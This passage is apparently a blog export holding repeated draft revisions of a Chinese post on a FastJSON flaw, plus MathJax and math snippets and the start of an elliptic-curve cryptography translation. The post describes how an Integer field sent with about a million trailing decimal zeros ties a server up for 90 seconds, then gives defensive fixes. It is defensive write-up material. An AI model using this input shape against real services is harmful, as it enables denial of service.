03:40:17"},{"id":"5ddb4d252ee0ee0001818fb7","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n攻击请求样例见附件\\n\\n\\n\\n分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}],[\"image\",{}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[1,\"p\",[]]]}","created_at_ts":1574653221441,"created_at":"2019-11-25 03:40:21"},{"id":"5ddb4d2d2ee0ee0001818fb9","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n攻击请求样例见附件\\n\\n\\n\\n分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我们带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653229375,"created_at":"2019-11-25 03:40:29"},{"id":"5ddb4d382ee0ee0001818fbb","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我们带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653240652,"created_at":"2019-11-25 03:40:40"},{"id":"5ddb4d3e2ee0ee0001818fbd","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我们带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653246155,"created_at":"2019-11-25 03:40:46"},{"id":"5ddb4d412ee0ee0001818fbf","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我们带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653249741,"created_at":"2019-11-25 03:40:49"},{"id":"5ddb4d4c2ee0ee0001818fc1","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n### 解决方案\\n\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我们带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653260624,"created_at":"2019-11-25 03:41:00"},{"id":"5ddb4d562ee0ee0001818fc3","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n### 解决方案\\n\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我带来了一些的思考\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653270765,"created_at":"2019-11-25 03:41:10"},{"id":"5ddb4d5b2ee0ee0001818fc5","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n### 解决方案\\n\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我带来了一些的思考:\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653275836,"created_at":"2019-11-25 03:41:15"},{"id":"5ddb4e0f2ee0ee0001818fca","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"### 背景\\n\\n近日, 慢雾安全平台的白帽子给公司项目提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n\\n### 分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n### 解决方案\\n\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/3.png\"}],[\"markdown\",{\"markdown\":\"\\nc. 在涉及到解析用户提交的数据时, 谨慎使用BigDecimal类型, 当确实需要准确精度保证时, 可以考虑先将小数数据转换为String类型, 在校验数据长度后再将数据转为BigDecimal\\n\\n\\n\\n这次的问题也给我带来了一些的思考:\\n\\n使用BigDecimal的优势是能够确保精度不丢失, 但这背后的性能开销和安全风险也是值得我们在开发过程中认真考虑的问题\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1574653455203,"created_at":"2019-11-25 03:44:15"},{"id":"5def0e182ee0ee0001818fd3","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[],\"sections\":[[1,\"p\",[]]]}","created_at_ts":1575947800774,"created_at":"2019-12-10 03:16:40"},{"id":"5df35add2ee0ee0001818fd9","post_id":"5df35add2ee0ee0001818fd7","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1576229597918,"created_at":"2019-12-13 09:33:17"},{"id":"5df74fdb2ee0ee0001818fe2","post_id":"5df74fdb2ee0ee0001818fe0","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1576488923095,"created_at":"2019-12-16 09:35:23"},{"id":"5df750192ee0ee0001818fe9","post_id":"5df750192ee0ee0001818fe7","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1576488985245,"created_at":"2019-12-16 09:36:25"},{"id":"5df7501d2ee0ee0001818feb","post_id":"5df750192ee0ee0001818fe7","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[],\"sections\":[[1,\"p\",[]]]}","created_at_ts":1576488989863,"created_at":"2019-12-16 09:36:29"},{"id":"5df750602ee0ee0001818ff3","post_id":"5df750602ee0ee0001818ff1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1576489056099,"created_at":"2019-12-16 09:37:36"},{"id":"5dfc26ad2ee0ee0001819003","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1576806061832,"created_at":"2019-12-20 01:41:01"},{"id":"5dfc26cb2ee0ee0001819005","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}],[\"html\",{\"html\":\"<math display=\\\"block\\\">\\n  <mtable columnalign=\\\"right left\\\" columnspacing=\\\"1em\\\" rowspacing=\\\"4pt\\\">\\n    <mtr>\\n      <mtd>\\n        <mi>a</mi>\\n        <mi>P</mi>\\n        <mo>+</mo>\\n        <mi>b</mi>\\n        <mi>Q</mi>\\n      </mtd>\\n      <mtd>\\n        <mo>=</mo>\\n        <mi>A</mi>\\n        <mi>P</mi>\\n        <mo>+</mo>\\n        <mi>B</mi>\\n        <mi>Q</mi>\\n      </mtd>\\n    </mtr>\\n    <mtr>\\n      <mtd>\\n        <mi>a</mi>\\n        <mi>P</mi>\\n        <mo>+</mo>\\n        <mi>b</mi>\\n        <mi>x</mi>\\n        <mi>P</mi>\\n      </mtd>\\n      <mtd>\\n        <mo>=</mo>\\n        <mi>A</mi>\\n        <mi>P</mi>\\n        <mo>+</mo>\\n        <mi>B</mi>\\n        <mi>x</mi>\\n        <mi>P</mi>\\n      </mtd>\\n    </mtr>\\n    <mtr>\\n      <mtd>\\n        <mo stretchy=\\\"false\\\">(</mo>\\n        <mi>a</mi>\\n        <mo>+</mo>\\n        <mi>b</mi>\\n        <mi>x</mi>\\n        <mo stretchy=\\\"false\\\">)</mo>\\n        <mi>P</mi>\\n      </mtd>\\n      <mtd>\\n        <mo>=</mo>\\n        <mo stretchy=\\\"false\\\">(</mo>\\n        <mi>A</mi>\\n        <mo>+</mo>\\n        <mi>B</mi>\\n        <mi>x</mi>\\n        <mo stretchy=\\\"false\\\">)</mo>\\n        <mi>P</mi>\\n      </mtd>\\n    </mtr>\\n    <mtr>\\n      <mtd>\\n        <mo stretchy=\\\"false\\\">(</mo>\\n        <mi>a</mi>\\n        <mo>&#x2212;</mo>\\n        <mi>A</mi>\\n        <mo stretchy=\\\"false\\\">)</mo>\\n        <mi>P</mi>\\n      </mtd>\\n      <mtd>\\n        <mo>=</mo>\\n        <mo stretchy=\\\"false\\\">(</mo>\\n        <mi>B</mi>\\n        <mo>&#x2212;</mo>\\n        <mi>b</mi>\\n        <mo stretchy=\\\"false\\\">)</mo>\\n        <mi>x</mi>\\n        <mi>P</mi>\\n      </mtd>\\n    </mtr>\\n  </mtable>\\n</math>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[1,\"p\",[]]]}","created_at_ts":1576806091595,"created_at":"2019-12-20 01:41:31"},{"id":"5dfc27612ee0ee0001819007","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}],[\"html\",{\"html\":\"\\\\begin{array}{rl}\\n  aP + bQ & = AP + BQ \\\\\\\\\\n  aP + bxP & = AP + BxP \\\\\\\\\\n  (a + bx) P & = (A + Bx) P \\\\\\\\\\n  (a - A) P & = (B - b) xP\\n\\\\end{array}\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[1,\"p\",[]]]}","created_at_ts":1576806241420,"created_at":"2019-12-20 01:44:01"},{"id":"5dfc278a2ee0ee0001819009","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}],[\"html\",{\"html\":\"\\\\begin{array}{rl}\\n  aP + bQ & = AP + BQ \\\\\\\\\\n  aP + bxP & = AP + BxP \\\\\\\\\\n  (a - A) P & = (B - b) xP\\n\\\\end{array}\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[1,\"p\",[]]]}","created_at_ts":1576806282079,"created_at":"2019-12-20 01:44:42"},{"id":"5dfc7c982ee0ee000181900c","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1576828056891,"created_at":"2019-12-20 07:47:36"},{"id":"5e006c7c2ee0ee00018198bf","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 